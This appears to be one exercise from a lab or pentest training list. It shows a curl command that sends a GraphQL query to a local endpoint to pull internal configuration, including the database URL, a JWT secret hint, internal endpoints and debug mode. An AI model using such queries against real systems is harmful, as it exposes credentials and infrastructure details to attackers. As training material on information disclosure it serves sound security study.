## 12 - Internal infrastructure disclosure via GraphQL

### Goal
Extract infrastructure/config metadata from GraphQL.

### Example

```bash
curl -s http://127.0.0.1:4000/api/graphql \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"query{ systemConfig { databaseUrl uploadFolder jwtSecretHint internalEndpoints debugMode } }\"}"
```

